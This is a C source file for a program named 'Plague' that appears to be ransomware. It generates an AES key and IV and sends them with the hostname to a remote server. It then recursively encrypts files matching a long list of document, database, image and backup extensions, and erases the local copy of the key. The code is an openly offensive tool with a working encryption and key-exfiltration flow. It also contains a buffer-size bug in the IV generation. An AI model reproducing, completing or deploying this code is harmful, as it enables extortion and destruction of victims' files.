
#include "includes/plague.h"

void handleError()
{
    unsigned long errCode;

    while ((errCode = ERR_get_error()))
    {
        char *err = ERR_error_string(errCode, NULL);
        printf("%s\n", err);
    }
    abort();
}

char *str_concat(int nb_arg, ...) {
    int i;
    char *path;
    char *tmp;
    va_list ap;

    va_start(ap, nb_arg);
    if (!(path = malloc(1)))
        return NULL;
    *path = '\0';
    for (i = 0; i < nb_arg; i++) {
        tmp = va_arg(ap, char *);
        if (!(path = realloc(path, strlen(path) + strlen(tmp) + 1)))
            return NULL;
        path = strcat(path, tmp);
    }
    va_end(ap);
    return path;
}

void print_file_content(const char *path) {
    unsigned char buf[128];
    unsigned int size;
    FILE *fd;

    if (!(fd = fopen(path, "r")))
        handleError();
    while ((size = fread(buf, 1, sizeof(buf), fd)) > 0)
    {
        BIO_dump_fp (stdout, (const char *)buf, (int)size);
    }
    fclose(fd);
}


int in_whitelist(char *str)
{
  char *whitelist[] = {"..", ".", 0};

  for (int i = 0; whitelist[i] ; i++)
    if (strcmp(whitelist[i], str) == 0)
      return 1;
  return 0;
}

int check_ext(const char *path)
{
    // List of extentions files to encrypt.
    char *ext[] = {".docx", ".ppam", ".sti", ".vcd", ".3gp", ".sch", ".myd", ".wb2", ".docb", ".potx", ".sldx", ".jpeg",
                  ".mp4", ".dch", ".frm", ".slk", ".docm", ".potm", ".sldm", ".jpg", ".mov", ".dip", ".odb", ".dif",
                  ".dot", ".pst", ".sldm", ".bmp", ".avi", ".pl", ".dbf", ".stc", ".dotm", ".ost", ".vdi", ".png",
                  ".asf", ".vb", ".db", ".sxc", ".dotx", ".msg", ".vmdk", ".gif", ".mpeg", ".vbs", ".mdb", ".ots",
                  ".xls", ".eml", ".vmx", ".raw", ".vob", ".ps1", ".accdb", ".ods", ".xlsm", ".vsd", ".aes", ".tif",
                  ".wmv", ".cmd", ".sqlitedb", ".max", ".xlsb", ".vsdx", ".ARC", ".tiff", ".fla", ".js", ".sqlite3",
                  ".3ds", ".xlw", ".txt", ".PAQ", ".nef", ".swf", ".asm", ".asc", ".uot", ".xlt", ".csv", ".bz2", ".psd",
                  ".wav", ".h", ".lay6", ".stw", ".xlm", ".rtf", ".tbk", ".ai", ".mp3", ".pas", ".lay", ".sxw", ".xlc",
                  ".123", ".bak", ".svg", ".sh", ".cpp", ".mml", ".ott", ".xltx", ".wks", ".tar", ".djvu", ".class",
                  ".c", ".sxm", ".odt", ".xltm", ".wk1", ".tgz", ".m4u", ".jar", ".cs", ".otg", ".pem", ".ppt", ".pdf",
                  ".gz", ".m3u", ".java", ".suo", ".odg", ".p12", ".pptx", ".dwg", ".7z", ".mid", ".rb", ".sln", ".uop",
                  ".csr", ".pptm", ".onetoc2", ".rar", ".wma", ".asp", ".ldf", ".std", ".crt", ".pot", ".snt", ".zip",
                  ".flv", ".php", ".mdf", ".sxd", ".key", ".pps", ".hwp", ".backup", ".3g2", ".jsp", ".ibd", ".otp",
                  ".pfx", ".ppsm", ".602", ".iso", ".mkv", ".brd", ".myi", ".odp", ".der", ".ppsx", ".sxi", NULL};

    //TODO Remplacer par un endWith()
    for (int i = 0; ext[i]; i++)
    {
        if (strstr(path, ext[i]))
            return 1;
    }
    return 0;
}

void apply_for_all(const char *path, void (*fct)(unsigned char [], unsigned char [], const char *), unsigned char key[], unsigned char iv[])
{
  DIR *d;
  struct dirent *dir;
  struct stat s;
  char *str = NULL;

  if (path && (d = opendir(path)))
  {
    while ((dir = readdir(d)) != NULL)
    {
      if (in_whitelist(dir->d_name))
        continue;
      //str = str_concat(3, path, "\\", dir->d_name);               // Windows
      str = str_concat(3, path, "/", dir->d_name);          // Linux
        if ((stat(str, &s) == 0) && (s.st_mode & S_IFDIR))
        apply_for_all(str, fct, key, iv);
        else
          fct(key, iv, str);
      free(str);
      str = NULL;
      //printf("%s\n", dir->d_name);
    }
    closedir(d);
  }
}

int main()
{
    unsigned char key[KEY_SIZE];             // A 256 bit key
    unsigned char iv[IV_SIZE];              // A 128 bit IV
    //char *path = strdup("C:\\");                                  // Windows
    char *path = strdup("/home/kali/CLionProjects/Plague/test"); // Linux
    char *encoded_key, *encoded_iv;
    int check = 0;

    // TODO rand_seed() to set unpredictable random
    //RAND_seed(&buf, 10);
    if (!RAND_bytes(key, KEY_SIZE))    // Key random generation
        handleError();
    if (!RAND_bytes(iv, KEY_SIZE))     //  IV random generation
        handleError();

    // BIO_dump_fp (stdout, (const char *)key, (int)KEY_SIZE);      // DEBUG

    // Send key and IV to server
    // Encode in hexa
    encoded_key = encode_hex(key, KEY_SIZE);
    encoded_iv = encode_hex(iv, IV_SIZE);
    check = send_key(encoded_key, encoded_iv, get_hostname());
    if (check == 1)
        return 0;

    // Encrypt
    apply_for_all(path, &encrypt_file, key, iv);

    free(path);
    memset(key, 0, KEY_SIZE);                                   // Erase memory where was store the key
    memset(encoded_key, 0, KEY_SIZE * 2);
    free(encoded_key);
    //system("PAUSE");                                             // Windows
    return 0;
}